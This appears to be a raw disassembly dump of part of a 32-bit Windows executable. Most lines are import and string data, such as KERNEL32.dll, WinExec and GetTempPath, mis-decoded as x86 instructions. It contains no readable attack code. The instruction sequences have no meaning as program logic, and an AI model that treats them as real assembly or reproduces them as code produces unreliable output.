  4133bd:	outs   dx,BYTE PTR ds:[esi]
  4133be:	outs   dx,WORD PTR ds:[esi]
  4133c0:	add    BYTE PTR [eax],al
  4133c2:	out    dx,al
  4133c3:	add    DWORD PTR [ebx+0x65],edx
  4133c6:	je     0x413418
  4133c8:	popa   
  4133c9:	ins    BYTE PTR es:[edi],dx
  4133ca:	gs je  0x413441
  4133cd:	gs inc ebp
  4133cf:	outs   dx,BYTE PTR ds:[esi]
  4133d0:	je     0x413444
  4133d2:	imul   esp,DWORD PTR [ebp+0x73],0x5301d300
  4133d9:	gs je  0x41341e
  4133dc:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x6d694470
  4133e4:	outs   dx,BYTE PTR gs:[esi]
  4133e6:	jae    0x413451
  4133e8:	outs   dx,DWORD PTR ds:[esi]
  4133e9:	outs   dx,BYTE PTR ds:[esi]
  4133ea:	inc    ebp
  4133eb:	js     0x4133ed
  4133ed:	add    BYTE PTR [esi],al
  4133ef:	add    dl,BYTE PTR [ebx+0x74]
  4133f2:	jb     0x413459
  4133f4:	je     0x413459
  4133f6:	push   0x746c42
  4133fb:	add    BYTE PTR [eax+eax*1+0x61657243],dl
  413402:	je     0x413469
  413404:	inc    esp
  413405:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  41340c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  413410:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x13f0070
  413418:	inc    edi
  413419:	gs je  0x413460
  41341c:	dec    ecx
  41341d:	inc    edx
  41341e:	inc    ebx
  41341f:	outs   dx,DWORD PTR ds:[esi]
  413420:	ins    BYTE PTR es:[edi],dx
  413421:	outs   dx,DWORD PTR ds:[esi]
  413422:	jb     0x413478
  413424:	popa   
  413425:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  413429:	add    BYTE PTR [edi+0x6e694c01],dl
  41342f:	gs push esp
  413431:	outs   dx,DWORD PTR ds:[esi]
  413432:	add    BYTE PTR [eax],al
  413434:	clc    
  413435:	add    DWORD PTR [ebx+0x65],edx
  413438:	je     0x41348e
  41343a:	gs js  0x4134b1
  41343d:	inc    ecx
  41343e:	ins    BYTE PTR es:[edi],dx
  41343f:	imul   esp,DWORD PTR [edi+0x6e],0x1a40000
  413446:	push   eax
  413447:	popa   
  413448:	je     0x41348c
  41344a:	ins    BYTE PTR es:[edi],dx
  41344b:	je     0x41344d
  41344d:	add    BYTE PTR [ebp+0x0],dh
  413450:	inc    edx
  413451:	imul   ebp,DWORD PTR gs:[bp+0x50],0x687461
  41345a:	test   al,0x0
  41345c:	inc    ebx
  41345d:	jb     0x4134c4
  41345f:	popa   
  413460:	je     0x4134c7
  413462:	push   eax
  413463:	outs   dx,BYTE PTR gs:[esi]
  413465:	dec    ecx
  413466:	outs   dx,BYTE PTR ds:[esi]
  413467:	imul   esi,DWORD PTR fs:[edx+0x65],0x83007463
  41346f:	add    DWORD PTR [edi+0x65],eax
  413472:	je     0x4134c8
  413474:	gs js  0x4134eb
  413477:	inc    ebp
  413478:	js     0x4134ee
  41347a:	outs   dx,BYTE PTR gs:[esi]
  41347c:	je     0x4134ce
  41347e:	outs   dx,DWORD PTR ds:[esi]
  41347f:	imul   ebp,DWORD PTR [esi+0x74],0x413233
  413486:	aam    0x1
  413488:	push   ebx
  413489:	gs je  0x4134ce
  41348c:	imul   eax,DWORD PTR [ebx+0x6f],0x6c
  413490:	outs   dx,DWORD PTR ds:[esi]
  413491:	jb     0x413493
  413493:	add    bl,dh
  413495:	add    DWORD PTR [ebx+0x65],edx
  413498:	je     0x4134ec
  41349a:	dec    edi
  41349b:	push   eax
  41349c:	xor    al,BYTE PTR [eax]
  41349e:	stos   BYTE PTR es:[edi],al
  41349f:	add    BYTE PTR [ebx+0x72],al
  4134a2:	gs popa 
  4134a4:	je     0x41350b
  4134a6:	push   eax
  4134a7:	outs   dx,DWORD PTR ds:[esi]
  4134a8:	ins    BYTE PTR es:[edi],dx
  4134a9:	jns    0x413512
  4134ab:	outs   dx,DWORD PTR ds:[esi]
  4134ac:	outs   dx,BYTE PTR ds:[esi]
  4134ad:	push   edx
  4134ae:	outs   dx,BYTE PTR ds:[si]
  4134b0:	add    BYTE PTR [eax],al
  4134b2:	xchg   DWORD PTR [ecx],eax
  4134b4:	inc    edi
  4134b5:	gs je  0x41350c
  4134b8:	gs js  0x41352f
  4134bb:	inc    ebp
  4134bc:	js     0x413532
  4134be:	outs   dx,BYTE PTR gs:[esi]
  4134c0:	je     0x413512
  4134c2:	outs   dx,DWORD PTR ds:[esi]
  4134c3:	imul   ebp,DWORD PTR [esi+0x74],0x2010057
  4134ca:	push   ebx
  4134cb:	gs je  0x413525
  4134ce:	imul   ebp,DWORD PTR [esi+0x64],0x724f776f
  4134d5:	addr16 inc ebp
  4134d7:	js     0x4134d9
  4134d9:	add    BYTE PTR [edi+0x65724300],ah
  4134df:	popa   
  4134e0:	je     0x413547
  4134e2:	push   eax
  4134e3:	outs   dx,BYTE PTR gs:[esi]
  4134e5:	add    BYTE PTR [esi+0x74654701],cl
  4134eb:	push   esi
  4134ec:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  4134f3:	dec    edi
  4134f4:	jb     0x41355d
  4134f6:	inc    ebp
  4134f7:	js     0x4134f9
  4134f9:	add    ch,cl
  4134fb:	add    BYTE PTR [ebp+0x73],al
  4134fe:	arpl   WORD PTR [ecx+0x70],sp
  413501:	add    BYTE PTR gs:[eax],al
  413504:	mov    bl,0x1
  413506:	push   eax
  413507:	outs   dx,DWORD PTR ds:[esi]
  413508:	ins    BYTE PTR es:[edi],dx
  413509:	jns    0x413572
  41350b:	outs   dx,DWORD PTR ds:[esi]
  41350c:	outs   dx,BYTE PTR ds:[esi]
  41350d:	add    BYTE PTR [ebx+0x65724300],ch
  413513:	popa   
  413514:	je     0x41357b
  413516:	push   edx
  413517:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  41351c:	outs   dx,BYTE PTR ds:[esi]
  41351d:	add    BYTE PTR [ecx+eax*1+0x54746547],al
  413524:	gs js  0x41359b
  413527:	inc    ebp
  413528:	js     0x41359e
  41352a:	outs   dx,BYTE PTR gs:[esi]
  41352c:	je     0x41357e
  41352e:	outs   dx,DWORD PTR ds:[esi]
  41352f:	imul   ebp,DWORD PTR [esi+0x74],0x573233
  413536:	jo     0x413538
  413538:	inc    ecx
  413539:	fs fs inc esi
  41353c:	outs   dx,DWORD PTR ds:[esi]
  41353d:	outs   dx,BYTE PTR ds:[esi]
  41353e:	je     0x413592
  413540:	gs jae 0x4135b2
  413543:	jne    0x4135b7
  413545:	arpl   WORD PTR [ebp+0x57],sp
  413548:	add    BYTE PTR [eax],al
  41354a:	inc    ecx
  41354b:	add    DWORD PTR [edi+0x65],eax
  41354e:	je     0x413594
  413550:	gs jbe 0x4135bc
  413553:	arpl   WORD PTR [ebp+0x43],sp
  413556:	popa   
  413557:	jo     0x4135cc
  413559:	add    BYTE PTR [esi+0x1],ch
  41355c:	inc    edi
  41355d:	gs je  0x4135b0
  413560:	imul   edi,DWORD PTR [eax+0x65],0xd500006c
  413567:	add    BYTE PTR [ebp+0x78],al
  41356a:	je     0x4135c0
  41356c:	gs js  0x4135e3
  41356f:	dec    edi
  413570:	jne    0x4135e6
  413572:	push   edi
  413573:	add    BYTE PTR [esi+0x65724300],ah
  413579:	popa   
  41357a:	je     0x4135e1
  41357c:	push   eax
  41357d:	popa   
  41357e:	je     0x4135f4
  413580:	gs jb  0x4135f1
  413583:	inc    edx
  413584:	jb     0x4135fb
  413586:	jae    0x4135f0
  413588:	add    BYTE PTR [eax],al
  41358a:	into   
  41358b:	add    BYTE PTR [ebp+0x78],al
  41358e:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  413592:	gs inc ebx
  413594:	ins    BYTE PTR es:[edi],dx
  413595:	imul   esi,DWORD PTR [eax+0x52],0x746365
  41359c:	lds    eax,FWORD PTR [eax]
  41359e:	inc    ebp
  41359f:	outs   dx,BYTE PTR ds:[esi]
  4135a0:	jne    0x41360f
  4135a2:	inc    esi
  4135a3:	outs   dx,DWORD PTR ds:[esi]
  4135a4:	outs   dx,BYTE PTR ds:[esi]
  4135a5:	je     0x4135ed
  4135a7:	popa   
  4135a8:	ins    DWORD PTR es:[edi],dx
  4135a9:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x47005773
  4135b1:	inc    esp
  4135b2:	dec    ecx
  4135b3:	xor    esi,DWORD PTR [edx]
  4135b5:	cs fs ins BYTE PTR es:[edi],dx
  4135b8:	ins    BYTE PTR es:[edi],dx
  4135b9:	add    BYTE PTR [edi+0x74654701],bl
  4135bf:	inc    ebx
  4135c0:	outs   dx,DWORD PTR ds:[esi]
  4135c1:	ins    DWORD PTR es:[edi],dx
  4135c2:	jo     0x413639
  4135c4:	je     0x41362b
  4135c6:	jb     0x413616
  4135c8:	popa   
  4135c9:	ins    DWORD PTR es:[edi],dx
  4135ca:	gs inc ecx
  4135cc:	add    BYTE PTR [eax],al
  4135ce:	sbb    eax,0x74655304
  4135d3:	dec    eax
  4135d4:	popa   
  4135d5:	outs   dx,BYTE PTR ds:[esi]
  4135d6:	fs ins BYTE PTR es:[edi],dx
  4135d8:	gs inc ebx
  4135da:	outs   dx,DWORD PTR ds:[esi]
  4135db:	jne    0x41364b
  4135dd:	je     0x4135df
  4135df:	add    BYTE PTR [edx],bh
  4135e1:	add    ecx,DWORD PTR [edi+0x70]
  4135e4:	outs   dx,BYTE PTR gs:[esi]
  4135e6:	inc    esi
  4135e7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x4300f200
  4135ef:	jb     0x413656
  4135f1:	popa   
  4135f2:	je     0x413659
  4135f4:	push   edi
  4135f5:	popa   
  4135f6:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  4135fe:	ins    DWORD PTR es:[edi],dx
  4135ff:	gs jb  0x413643
  413602:	add    BYTE PTR [eax],al
  413604:	and    al,0x3
  413606:	dec    ebp
  413607:	popa   
  413608:	jo     0x413660
  41360a:	imul   esp,DWORD PTR [ebp+0x77],0x6946664f
  413611:	ins    BYTE PTR es:[edi],dx
  413612:	add    BYTE PTR gs:[esp+eax*1],bh
  413616:	push   ebx
  413617:	gs je  0x41366e
  41361a:	push   0x64616572
  41361f:	push   eax
  413620:	jb     0x41368b
  413622:	outs   dx,DWORD PTR ds:[esi]
  413623:	jb     0x41368e
  413625:	je     0x4136a0
  413627:	add    BYTE PTR [edx+0x6f6c4702],dl
  41362d:	bound  esp,QWORD PTR [ecx+0x6c]
  413630:	inc    edi
  413631:	gs je  0x413675
  413634:	je     0x4136a5
  413636:	ins    DWORD PTR es:[edi],dx
  413637:	dec    esi
  413638:	popa   
  413639:	ins    DWORD PTR es:[edi],dx
  41363a:	gs push edi
  41363c:	add    BYTE PTR [eax],al
  41363e:	retf   
  41363f:	add    cl,BYTE PTR [ecx+0x73]
  413642:	inc    edx
  413643:	popa   
  413644:	fs push edx
  413646:	gs popa 
  413648:	fs push eax
  41364a:	je     0x4136be
  41364c:	add    BYTE PTR [eax],al
  41364e:	or     BYTE PTR [ecx],al
  413650:	inc    esp
  413651:	gs jbe 0x4136bd
  413654:	arpl   WORD PTR [ebp+0x49],sp
  413657:	outs   dx,DWORD PTR ds:[esi]
  413658:	inc    ebx
  413659:	outs   dx,DWORD PTR ds:[esi]
  41365a:	outs   dx,BYTE PTR ds:[esi]
  41365b:	je     0x4136cf
  41365d:	outs   dx,DWORD PTR ds:[esi]
  41365e:	ins    BYTE PTR es:[edi],dx
  41365f:	add    BYTE PTR [ecx+0x1],bl
  413662:	inc    esi
  413663:	imul   ebp,DWORD PTR [esi+0x64],0x736f6c43
  41366a:	add    BYTE PTR gs:[edx],cl
  41366d:	add    al,BYTE PTR [edi+0x65]
  413670:	je     0x4136bf
  413672:	outs   dx,DWORD PTR ds:[esi]
  413673:	fs jne 0x4136e2
  413676:	gs dec eax
  413678:	popa   
  413679:	outs   dx,BYTE PTR ds:[esi]
  41367a:	fs ins BYTE PTR es:[edi],dx
  41367c:	gs inc ecx
  41367e:	add    BYTE PTR [eax],al
  413680:	inc    edx
  413681:	add    DWORD PTR [esi+0x69],eax
  413684:	outs   dx,BYTE PTR ds:[esi]
  413685:	fs dec esi
  413687:	gs js  0x4136fe
  41368a:	inc    ebx
  41368b:	push   0x65676e61
  413690:	dec    esi
  413691:	outs   dx,DWORD PTR ds:[esi]
  413692:	je     0x4136fd
  413694:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41369a:	outs   dx,DWORD PTR ds:[esi]
  41369b:	outs   dx,BYTE PTR ds:[esi]
  41369c:	add    BYTE PTR [eax],al
  41369e:	xor    eax,0x74655304
  4136a3:	push   esp
  4136a4:	push   0x64616572
  4136a9:	inc    ecx
  4136aa:	data16 imul bp,WORD PTR [esi+0x69],0x7974
  4136b1:	dec    ebp
  4136b2:	popa   
  4136b3:	jae    0x413720
  4136b5:	add    BYTE PTR [esi],bl
  4136b7:	add    al,BYTE PTR [edi+0x65]
  4136ba:	je     0x41370c
  4136bc:	jb     0x413727
  4136be:	outs   dx,DWORD PTR ds:[esi]
  4136bf:	jb     0x41372a
  4136c1:	je     0x41373c
  4136c3:	inc    ebx
  4136c4:	ins    BYTE PTR es:[edi],dx
  4136c5:	popa   
  4136c6:	jae    0x41373b
  4136c8:	add    BYTE PTR [eax],al
  4136ca:	sti    
  4136cb:	add    DWORD PTR [edi+0x65],eax
  4136ce:	je     0x41371c
  4136d0:	popa   
  4136d1:	jae    0x413747
  4136d3:	inc    ebp
  4136d4:	jb     0x413748
  4136d6:	outs   dx,DWORD PTR ds:[esi]
  4136d7:	jb     0x4136d9
  4136d9:	add    BYTE PTR [edi],dl
  4136db:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  4136df:	imul   eax,DWORD PTR [esi+0x69],0x6c
  4136e3:	add    BYTE PTR gs:[eax],al
  4136e6:	retf   
  4136e7:	add    DWORD PTR [edi+0x65],eax
  4136ea:	je     0x41372f
  4136ec:	jne    0x413760
  4136ee:	jb     0x413755
  4136f0:	outs   dx,BYTE PTR ds:[esi]
  4136f1:	je     0x413737
  4136f3:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4136fa:	jns    0x413753
  4136fc:	add    BYTE PTR [eax],al
  4136fe:	mov    BYTE PTR [eax],al
  413700:	inc    ecx
  413701:	jb     0x413768
  413703:	inc    esi
  413704:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x41736970
  41370c:	dec    esi
  41370d:	push   ebx
  41370e:	dec    ecx
  41370f:	add    BYTE PTR ds:0x74655304,ah
  413715:	dec    ebp
  413716:	popa   
  413717:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x6e49746f
  41371f:	outs   dx,WORD PTR ds:[esi]
  413721:	add    dl,cl
  413723:	add    BYTE PTR [ebx+0x72],al
  413726:	gs popa 
  413728:	je     0x41378f
  41372a:	inc    ebp
  41372b:	jbe    0x413792
  41372d:	outs   dx,BYTE PTR ds:[esi]
  41372e:	je     0x413771
  413730:	add    BYTE PTR [eax],al
  413732:	outs   dx,BYTE PTR ds:[esi]
  413733:	add    DWORD PTR [esi+0x69],eax
  413736:	outs   dx,BYTE PTR ds:[esi]
  413737:	fs push edx
  413739:	gs jae 0x4137ab
  41373c:	jne    0x4137b0
  41373e:	arpl   WORD PTR [ebp+0x45],sp
  413741:	js     0x41379a
  413743:	add    BYTE PTR [eax+0x3],bh
  413746:	push   edx
  413747:	gs popa 
  413749:	fs inc esi
  41374b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x47026100
  413753:	gs je  0x4137aa
  413756:	gs ins DWORD PTR es:[edi],dx
  413758:	jo     0x4137aa
  41375a:	popa   
  41375b:	je     0x4137c5
  41375d:	inc    ecx
  41375e:	add    BYTE PTR [eax],al
  413760:	mov    DWORD PTR [edx],eax
  413762:	inc    edi
  413763:	ins    BYTE PTR es:[edi],dx
  413764:	outs   dx,DWORD PTR ds:[esi]
  413765:	bound  esp,QWORD PTR [ecx+0x6c]
  413768:	inc    ecx
  413769:	ins    BYTE PTR es:[edi],dx
  41376a:	ins    BYTE PTR es:[edi],dx
  41376b:	outs   dx,DWORD PTR ds:[esi]
  41376c:	arpl   WORD PTR [eax],ax
  41376e:	xchg   esp,eax
  41376f:	add    al,0x57
  413771:	imul   ebp,DWORD PTR [esi+0x45],0x636578
  413778:	bound  eax,QWORD PTR [edx]
  41377a:	inc    edi
  41377b:	gs je  0x4137d2
  41377e:	gs ins DWORD PTR es:[edi],dx
  413780:	jo     0x4137d2
  413782:	popa   
  413783:	je     0x4137ed
  413785:	push   edi
  413786:	add    BYTE PTR [eax],al
  413788:	rol    BYTE PTR [eax],1
  41378a:	inc    ebx
  41378b:	jb     0x4137f2
  41378d:	popa   
  41378e:	je     0x4137f5
  413790:	inc    esi
  413791:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x47026700
  413799:	gs je  0x4137f0
  41379c:	push   0x64616572
  4137a1:	dec    esp
  4137a2:	outs   dx,DWORD PTR ds:[esi]
  4137a3:	arpl   WORD PTR [ecx+0x6c],sp
  4137a6:	add    BYTE PTR gs:[eax],ah
  4137a9:	add    DWORD PTR [ebp+0x6e],eax
  4137ac:	jne    0x41381b
  4137ae:	push   edx
  4137af:	gs jae 0x413821
  4137b2:	jne    0x413826
  4137b4:	arpl   WORD PTR [ebp+0x4e],sp
  4137b7:	popa   
  4137b8:	ins    DWORD PTR es:[edi],dx
  4137b9:	gs jae 0x4137fd
  4137bc:	add    BYTE PTR [eax],al
  4137be:	repz add DWORD PTR [edi+0x65],eax
  4137c2:	je     0x41380a
  4137c4:	jne    0x413832
  4137c6:	ins    BYTE PTR es:[edi],dx
  4137c7:	push   eax
  4137c8:	popa   
  4137c9:	je     0x413833
  4137cb:	dec    esi
  4137cc:	popa   
  4137cd:	ins    DWORD PTR es:[edi],dx
  4137ce:	gs push edi
  4137d0:	add    BYTE PTR [eax],al
  4137d2:	push   eax
  4137d3:	add    DWORD PTR [esi+0x69],eax
  4137d6:	ins    BYTE PTR es:[edi],dx
  4137d7:	gs push esp
  4137d9:	imul   ebp,DWORD PTR [ebp+0x65],0x79536f54
  4137e0:	jae    0x413856
  4137e2:	gs ins DWORD PTR es:[edi],dx
  4137e4:	push   esp
  4137e5:	imul   ebp,DWORD PTR [ebp+0x65],0xe60000
  4137ec:	inc    ebx
  4137ed:	jb     0x413854
  4137ef:	popa   
  4137f0:	je     0x413857
  4137f2:	push   edx
  4137f3:	gs ins DWORD PTR es:[edi],dx
  4137f5:	outs   dx,DWORD PTR ds:[esi]
  4137f6:	je     0x41385d
  4137f8:	push   esp
  4137f9:	push   0x64616572
  4137fe:	add    BYTE PTR [eax],al
  413800:	jns    0x413804
  413802:	inc    edi
  413803:	gs je  0x41385c
  413806:	gs jb  0x41387c
  413809:	imul   ebp,DWORD PTR [edi+0x6e],0x1010000
  413810:	inc    esp
  413811:	gs ins BYTE PTR es:[edi],dx
  413813:	gs je  0x41387b
  413816:	inc    ebx
  413817:	jb     0x413882
  413819:	je     0x413884
  41381b:	arpl   WORD PTR [ecx+0x6c],sp
  41381e:	push   ebx
  41381f:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  413824:	outs   dx,BYTE PTR ds:[esi]
  413825:	add    BYTE PTR [ecx],cl
  413827:	add    al,BYTE PTR [edi+0x65]
  41382a:	je     0x413879
  41382c:	outs   dx,DWORD PTR ds:[esi]
  41382d:	fs jne 0x41389c
  413830:	gs inc esi
  413832:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  41383a:	add    BYTE PTR [eax],al
  41383c:	dec    edi
  41383d:	add    al,0x53
  41383f:	jne    0x4138b4
  413841:	jo     0x4138a8
  413843:	outs   dx,BYTE PTR ds:[esi]
  413844:	fs push esp
  413846:	push   0x64616572
  41384b:	add    ah,cl
  41384d:	add    al,0x6c
  41384f:	jae    0x4138c5
  413851:	jb     0x4138b6
  413853:	jo     0x4138ce
  413855:	outs   dx,BYTE PTR ds:[esi]
  413856:	push   edi
  413857:	add    bh,dh
  413859:	add    DWORD PTR [edi+0x65],eax
  41385c:	je     0x4138a6
  41385e:	popa   
  41385f:	outs   dx,BYTE PTR ds:[esi]
  413860:	fs ins BYTE PTR es:[edi],dx
  413862:	gs dec ecx
  413864:	outs   dx,BYTE PTR ds:[esi]
  413865:	outs   dx,WORD PTR ds:[esi]
  413867:	jb     0x4138d6
  413869:	popa   
  41386a:	je     0x4138d5
  41386c:	outs   dx,DWORD PTR ds:[esi]
  41386d:	outs   dx,BYTE PTR ds:[esi]
  41386e:	add    BYTE PTR [eax],al
  413870:	or     eax,DWORD PTR [ebx]
  413872:	dec    esp
  413873:	outs   dx,DWORD PTR ds:[esi]
  413874:	arpl   WORD PTR [ecx+0x6c],sp
  413877:	inc    ecx
  413878:	ins    BYTE PTR es:[edi],dx
  413879:	ins    BYTE PTR es:[edi],dx
  41387a:	outs   dx,DWORD PTR ds:[esi]
  41387b:	arpl   WORD PTR [eax],ax
  41387d:	add    BYTE PTR [ebx+0x2],ah
  413880:	inc    edi
  413881:	gs je  0x4138d8
  413884:	push   0x64616572
  413889:	inc    ebx
  41388a:	outs   dx,DWORD PTR ds:[esi]
  41388b:	outs   dx,BYTE PTR ds:[esi]
  41388c:	je     0x4138f3
  41388e:	js     0x413904
  413890:	add    BYTE PTR [eax],al
  413892:	ret    
  413893:	add    edx,DWORD PTR [edx+0x74]
  413896:	ins    BYTE PTR es:[edi],dx
  413897:	push   ebp
  413898:	outs   dx,BYTE PTR ds:[esi]
  413899:	ja     0x413904
  41389b:	outs   dx,BYTE PTR ds:[esi]
  41389c:	add    BYTE PTR fs:[ecx+eax*1+0x41746547],cl
  4138a4:	je     0x413915
  4138a6:	ins    DWORD PTR es:[edi],dx
  4138a7:	dec    esi
  4138a8:	popa   
  4138a9:	ins    DWORD PTR es:[edi],dx
  4138aa:	gs push edi
  4138ac:	add    BYTE PTR [eax],al
  4138ae:	jmp    0x6946:0x74654701
  4138b5:	ins    BYTE PTR es:[edi],dx
  4138b6:	gs inc ecx
  4138b8:	je     0x41392e
  4138ba:	jb     0x413925
  4138bc:	bound  esi,QWORD PTR [ebp+0x74]
  4138bf:	gs jae 0x413907
  4138c2:	js     0x413905
  4138c4:	add    BYTE PTR [eax],al
  4138c6:	inc    edx
  4138c7:	add    al,BYTE PTR [edi+0x65]
  4138ca:	je     0x41391f
  4138cc:	push   0x5074726f
  4138d1:	popa   
  4138d2:	je     0x41393c
  4138d4:	dec    esi
  4138d5:	popa   
  4138d6:	ins    DWORD PTR es:[edi],dx
  4138d7:	gs inc ecx
  4138d9:	add    bl,bl
  4138db:	add    edx,DWORD PTR [ebx+0x65]
  4138de:	popa   
  4138df:	jb     0x413944
  4138e1:	push   0x68746150
  4138e6:	inc    ecx
  4138e7:	add    BYTE PTR [eax+0x4],al
  4138ea:	push   ebx
  4138eb:	gs je  0x413942
  4138ee:	imul   ebp,DWORD PTR [ebp+0x65],0x65755172
  4138f5:	jne    0x41395c
  4138f7:	push   esp
  4138f8:	imul   ebp,DWORD PTR [ebp+0x65],0xb4000072
  4138ff:	add    edx,DWORD PTR [edx+0x65]
  413902:	ins    DWORD PTR es:[edi],dx
  413903:	outs   dx,DWORD PTR ds:[esi]
  413904:	jbe    0x41396b
  413906:	inc    esp
  413907:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  41390e:	jns    0x413967
  413910:	add    BYTE PTR [eax],al
  413912:	ret    
  413913:	add    al,0x6c
  413915:	jae    0x41398b
  413917:	jb     0x41397c
  413919:	ins    DWORD PTR es:[edi],dx
  41391a:	jo     0x413973
  41391c:	add    BYTE PTR [eax],al
  41391e:	dec    edi
  41391f:	add    DWORD PTR [esi+0x69],eax
  413922:	ins    BYTE PTR es:[edi],dx
  413923:	gs push esp
  413925:	imul   ebp,DWORD PTR [ebp+0x65],0x6f4c6f54
  41392c:	arpl   WORD PTR [ecx+0x6c],sp
  41392f:	inc    esi
  413930:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656d69
  413938:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413939:	add    BYTE PTR [ebx+0x61],al
  41393c:	outs   dx,BYTE PTR ds:[esi]
  41393d:	arpl   WORD PTR [ebp+0x6c],sp
  413940:	push   edi
  413941:	popa   
  413942:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  41394a:	ins    DWORD PTR es:[edi],dx
  41394b:	gs jb  0x41394e
  41394e:	dec    ebx
  41394f:	inc    ebp
  413950:	push   edx
  413951:	dec    esi
  413952:	inc    ebp
  413953:	dec    esp
  413954:	xor    esi,DWORD PTR [edx]
  413956:	cs fs ins BYTE PTR es:[edi],dx
  413959:	ins    BYTE PTR es:[edi],dx
  41395a:	add    BYTE PTR [eax],al
  41395c:	inc    esi
  41395d:	add    BYTE PTR [eax+0x61],dl
  413960:	je     0x4139ca
  413962:	inc    esi
  413963:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  41396a:	outs   dx,BYTE PTR ds:[esi]
  41396b:	jae    0x4139d6
  41396d:	outs   dx,DWORD PTR ds:[esi]
  41396e:	outs   dx,BYTE PTR ds:[esi]
  41396f:	inc    ecx
  413970:	add    BYTE PTR [eax],al
  413972:	inc    edi
  413973:	add    BYTE PTR [eax+0x61],dl
  413976:	je     0x4139e0
  413978:	inc    esi
  413979:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  413980:	outs   dx,BYTE PTR ds:[esi]
  413981:	jae    0x4139ec
  413983:	outs   dx,DWORD PTR ds:[esi]
  413984:	outs   dx,BYTE PTR ds:[esi]
  413985:	push   edi
  413986:	add    BYTE PTR [eax],al
  413988:	push   ebx
  413989:	dec    eax
  41398a:	dec    esp
  41398b:	push   edi
  41398c:	inc    ecx
  41398d:	push   eax
  41398e:	dec    ecx
  41398f:	cs fs ins BYTE PTR es:[edi],dx
  413992:	ins    BYTE PTR es:[edi],dx
  413993:	add    BYTE PTR [ebx+0x46],dh
  413996:	addr16 popa 
  413998:	pop    ecx
  413999:	dec    ebp
  41399a:	popa   
  41399b:	jns    0x4139f1
  41399d:	push   ecx
  41399e:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  4139a2:	je     0x413a05
  4139a4:	inc    ebx
  4139a5:	push   ecx
  4139a6:	ins    BYTE PTR es:[edi],dx
  4139a7:	pop    eax
  4139a8:	add    BYTE PTR [eax],al
  4139aa:	add    BYTE PTR [eax],al
  4139ac:	or     al,0x3e
  4139ae:	inc    ecx
  4139af:	add    BYTE PTR [esi+edi*1],dl
  4139b2:	inc    ecx
  4139b3:	add    ah,dh
  4139b5:	cmp    eax,DWORD PTR [ecx+0x0]
  4139b8:	call   0x794febc8
  4139bd:	dec    edi
  4139be:	ret    0x774e
  4139c1:	dec    edi
  4139c2:	cmp    eax,0x384f4f4f
  4139c7:	dec    edi
  4139c8:	jp     0x413a19
  4139ca:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139cd:	dec    edi
  4139ce:	ss dec edi
  4139d0:	add    ecx,DWORD PTR [edi+0x31]
  4139d3:	dec    edi
  4139d4:	ret    0x324e
  4139d7:	dec    edi
  4139d8:	push   ds
  4139d9:	push   edx
  4139da:	pop    ds
  4139db:	push   ebx
  4139dc:	cmp    DWORD PTR [edi+0x79],ecx
  4139df:	dec    edi
  4139e0:	ret    0x774e
  4139e3:	dec    edi
  4139e4:	cmp    eax,0x384f4f4f
  4139e9:	dec    edi
  4139ea:	jp     0x413a3b
  4139ec:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139ef:	dec    edi
  4139f0:	ss dec edi
  4139f2:	imul   ecx,DWORD PTR [edi+0x31],0x324ec24f
  4139f9:	dec    edi
  4139fa:	push   ds
  4139fb:	bound  ebx,QWORD PTR [edi]
  4139fd:	arpl   WORD PTR [ecx],di
  4139ff:	dec    edi
  413a00:	jns    0x413a51
  413a02:	ret    0x724e
  413a05:	dec    edi
  413a06:	cmp    eax,0x394f034f
  413a0b:	dec    edi
  413a0c:	dec    esp
  413a0d:	dec    edi
  413a0e:	xor    al,0x4f
  413a10:	ret    0x304e
  413a13:	dec    edi
  413a14:	push   ds
  413a15:	jb     0x413a36
  413a17:	jae    0x413a28
  413a19:	or     DWORD PTR [eax],0xffffff80
  413a1c:	js     0x4139ae
  413a1e:	jns    0x4139b1
  413a20:	aas    
  413a21:	dec    edi
  413a22:	jbe    0x413a73
  413a24:	ret    0x764e
  413a27:	dec    edi
  413a28:	ds dec edi
  413a2a:	dec    esp
  413a2b:	dec    edi
  413a2c:	cmp    DWORD PTR [edi+0x3],ecx
  413a2f:	dec    edi
  413a30:	xor    eax,0x364ec24f
  413a35:	dec    edi
  413a36:	push   ds
  413a37:	sbb    BYTE PTR [edi],0x83
  413a3a:	setae  BYTE PTR [eax]
  413a3d:	nop
  413a3e:	js     0x4139e0
  413a40:	jns    0x4139e3
  413a42:	aas    
  413a43:	dec    edi
  413a44:	jbe    0x413a95
  413a46:	ret    0x764e
  413a49:	dec    edi
  413a4a:	ds dec edi
  413a4c:	dec    esp
  413a4d:	dec    edi
  413a4e:	cmp    DWORD PTR [edi+0x69],ecx
  413a51:	dec    edi
  413a52:	xor    eax,0x364ec24f
  413a57:	dec    edi
  413a58:	push   ds
  413a59:	xchg   edx,eax
  413a5a:	pop    ds
  413a5b:	xchg   ebx,eax
  413a5c:	bt     DWORD PTR [eax],ecx
  413a5f:	mov    al,ds:0xb179b078
  413a64:	aas    
  413a65:	dec    edi
  413a66:	push   0x4e4ec24f
  413a6b:	dec    edi
